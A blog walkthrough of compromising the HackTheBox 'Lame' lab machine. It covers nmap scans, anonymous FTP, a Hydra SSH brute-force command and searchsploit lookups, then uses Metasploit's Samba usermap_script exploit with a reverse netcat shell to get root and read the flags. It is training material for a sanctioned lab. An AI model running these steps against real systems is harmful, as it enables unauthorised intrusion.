---
author:
  name: "Jack Collins"
title: "A very basic HackTheBox pentest example"
subtitle: "jackcollins.me.uk | Linux Admin UK"
date: 2023-04-10T20:15:08+01:00
draft: false
toc: false
images:
tags:
  - pentesting
  - walkthrough
  - hackthebox
---

- [Reconnaissance](#recon)
- [Enumeration](#enum)
- [Gaining Initial Access](#initial)
- [Privilege Escalation](#escalate)
- [Capture The Flag](#flag)
- [Conclusion / TL;DR](#tldr)

---

### Reconnaissance{#recon}

The first thing you'll want to do, when starting any penetration test, is scan for open ports. We'll need to recon the server for the OS and running services, so we can start to figure out an attack vector.  
We'll start with an Nmap scan, although you could easily use another tool. See my Nmap tool guide for further information.

Let's check the box is up and responding (always worth doing when using a VPN connection through to HackTheBox)

> sudo nmap -sn 10.10.10.3
```
kali@wlan0:~$ sudo nmap -sn 10.10.10.3
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:12 UTC
Nmap scan report for 10.10.10.3
Host is up (0.019s latency).
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

She's up, so let's take a peek through the keyhole;

> sudo nmap -sCV -T4 10.10.10.3
```
kali@wlan0:~$ sudo nmap -sCV -T4 10.10.10.3
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:14 UTC
	Nmap scan report for 10.10.10.3
	Host is up (0.019s latency).
	Not shown: 996 filtered ports
	PORT    STATE SERVICE     VERSION
	21/tcp  open  ftp         vsftpd 2.3.4
	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to 10.10.14.2
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      vsFTPd 2.3.4 - secure, fast, stable
	|_End of status
	22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	| ssh-hostkey: 
	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
	Host script results:
	|_clock-skew: mean: 2h10m32s, deviation: 2h49m45s, median: 10m29s
	| smb-os-discovery: 
	|   OS: Unix (Samba 3.0.20-Debian)
	|   Computer name: lame
	|   NetBIOS computer name: 
	|   Domain name: hackthebox.gr
	|   FQDN: lame.hackthebox.gr
	|_  System time: 2021-03-14T11:25:21-04:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_smb2-time: Protocol negotiation failed (SMB2)
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 65.58 seconds
```

---

### Enumeration{#enum}

So, based on our Nmap scan, we've established 4 open ports, with 3 possible attack vectors.

#### Port 21 - File Transfer Protocol (FTP)

As we can see from the output of nmap, specifically **"ftp-anon: Anonymous FTP login allowed (FTP code 230)"**, there is a File Transfer Protocol running on port 21, with Anonymous login allowed.

We'll want to take a look at this and see what it holds. Anonymous login allows us to at least see the files that are available via the following;

> ftp 10.10.10.3
```
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
```

When prompted for credentials, use 'anonymous' for the user Name and leave the Password blank;

```
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

> ftp> ls -la
```
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
```

> ftp> pwd
```
257 "/"
```

Unfortunately there's nothing there, and we're already in the highest possible directory location. Whilst there's potentially more possibilities for FTP, let's move on to take a look at another attack vector. We can always come back to this if needs be.

It's worth nothing to *always* use ls -la (a for 'all'), to make sure we don't miss any hidden files.

#### Port 22 - Secure Shell (SSH)

Our Nmap scan has established the version of SSH that is running on the target; **OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)**

We can also establish the version of SSH that is running by grabbing the SSH Banner from the server using Netcat;

> nc 10.10.10.3 22
```
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
```

Whilst bruteforcing SSH may come to mind, we generally don't want to try this, because it's loud and it almost never works (hardly any SSH logins are going to allow bruteforce, as the account will lock out or the constant connections will be blocked).  
If you really wanted to attempt a bruteforce of SSH, you could do so via Metasploit's ssh_login module, or with Hydra by using;

> hydra -l root-P passwords.txt 10.10.10.3 -t 4 ssh

You can use lowercase 'l' and 'p' options for a single userID or password, or uppercase to use wordlists. We'd have to know at least one or a few userIDs to make this even worth attempting. 'admin' and 'root' are sometimes worth a try.

Feel free to attempt this against HackTheBox's Lame server, but I didn't have much luck, after letting it run using the rockyou.txt password list, for a while.  
I was getting a super-speedy 28 attempts per minute, which just isn't worth the effort. Try this if you have a good gist of what the userid and password might be, or a short list thereof.

We can also take a quick look at whether there are any known exploits for the SSH version that is running;

> searchsploit ssh 4.7
```
Exploit Title
---------------------------------------------------------------
Fortinet FortiGate 4.x < 5.0.7 - SSH Backdoor Access 
OpenSSH 2.3 < 7.7 - Username Enumeration
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)
OpenSSH < 6.6 SFTP (x64) - Command Execution
OpenSSH < 6.6 SFTP - Command Execution
OpenSSH < 7.4 - Forwarded Unix Domain Sockets Privilege Escalation
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading
OpenSSH < 7.7 - User Enumeration (2)
---------------------------------------------------------------
```

As we can see from the results, there's some decent looking vulnerabilities that would potentially work against SSH 4.7, however none of them appear to offer the reverse shell capabilities we are looking for.  
Username Enumeration might be useful if we then wanted to go and complete a slow SSH bruteforce attack with Hydra, as above, but that's still too slow for us here.

The only juicy looking one would be that SSH Backdoor Access, but Unfortunately it only appears to work against FortiGate SSH.

Similar to the FTP port, there might be something more useful here, based on the fact that the server uses an old SSH version, however for Enumeration we want to quickly look at all our options. We can always dive in further should we not find anything of use on the other ports.  
Therefore, we'll now look at the last potential attack vector, via open port information, Samba.

#### Ports 139 & 445 - Samba (SMB)

Nmap has established that the version of Samba running is 3.0.20, so let's use searchsploit again and see if there are any vulnerabilities for that;

> searchsploit samba 3.0.20
```
Exploit Title
---------------------------------------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
Samba < 3.0.20 - Remote Heap Overflow
Samba < 3.0.20 - Remote Heap Overflow
Samba < 3.6.2 (x86) - Denial of Service (PoC)
---------------------------------------------------------------
```

Now that is a juicy result!

As we can see, a number of vulnerabilities specific to the version 3.0.20 of SMB have been identified, but the jackpot is the second one down.
Note the mention of Metasploit and Command Execution. That means there's a Metasploit module specifically designed to exploit this version of Samba, and likely get a reverse shell.

---

### Gaining Initial Access{#init}

We're going to use Metasploit, as suggested by searchsploit above, to see if we can get a reverse shell to HackTheBox's Lame server.  
If you've not used Metasploit before, I would advise reading up a little on it first. It can be quite in-depth and I'll only be touched surface-level commands here.

Open MSFConsole;

> msfconsole

Then search for the same version of Samba so we can identify the exploit mentioned by searchsploit;

> search samba 3.0.20
```
Matching Modules
================

#  Name                                Disclosure Date  Rank       Check  Description
-  ----                                ---------------  ----       -----  -----------
0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```

Well, there's only one, but it's definitely the juicy one we indentified above.
Let's load the exploit in to Metasploit, and set some options;

> use exploit/multi/samba/usermap_script
```
msf6 exploit(multi/samba/usermap_script) > 
```
> show options
```
Module options (exploit/multi/samba/usermap_script):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):
 
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST  192.168.1.43     yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Exploit target:

Id  Name
--  ----
0   Automatic
```

We'll want to set RHOSTS to the IP of the target box and LHOST to our IP.

**Important Note**: When using HackTheBox's VPN, you'll need to assign the IP of the openvpn connection as LHOST. To find this out, run *ip a* or *ifconfig* and use the IP listed under 'tun0'., likely to be a 10.10.X.X address.

> msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
```
RHOSTS => 10.10.10.3
```
> msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.2
```
LHOST => 10.10.14.2
```

In this case, we can leave the default payload as cmd/unix/reverse_netcat. Now run it;

> exploit
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 1 opened (10.10.14.2:4444 -> 10.10.10.3:53267) at 2021-03-14 19:39:35 +0000
```

Success! We're in!

---

### Privilege Escalation{#escalate}

Now that we have a shell, let's see who we are;

> whoami
```
root
```

It must be Christmas! No Privilege Escalation is required here, we're already root!  
Time to grab those flags.

---

### Capture The Flag{#flag}

We know we have a user and a root flag to find, so let's start by finding out where we are and moving around.  
Given that we know this is a Linux box, from our earlier Nmap scan and simply by spending a little time on the console, we can make an assumption that the user flag might be somewhere in a user's home directory, so let's take a look at /home

> pwd
```
/
```
> cd /home
> ls
```
ftp
makis
service
user
```
> ls makis
```
user.txt
```

Bingo. We can cat the user.txt file in /home/makis to get the User Flag and complete the first challenge.

Now, given that we know the User Flag was in a file called user.txt, we can make an assumption that the root flag might be in a file called root.txt.  
Rather than traverse around trying to look for it, let's try a search instead;

> find / -name "root.txt"
```
/root/root.txt
```

And there we have it! We can cat that file for the Root Flag and complete the second challenge.

We've now owned and completed HackTheBox's Lame server.

---

### Conclusion / TL;DR{#tldr}

In conclusion, then, we found multiple ports open on 10.10.10.3 with out-of-date services running on them.  
By checking searchsploit we narrowed down that there was a Metasploit vulnerability available for the SMB version that was running.

Once we successfully ran the exploit, we not only gained access to the box, but we were root right off the bat! So no Privilege Escalation required here.

On the server, we used simple logic to determine that the user.txt Flag was inside a user's Home Directory, 'matis', and then used find to search for root.txt.

---

[Top of page](#top)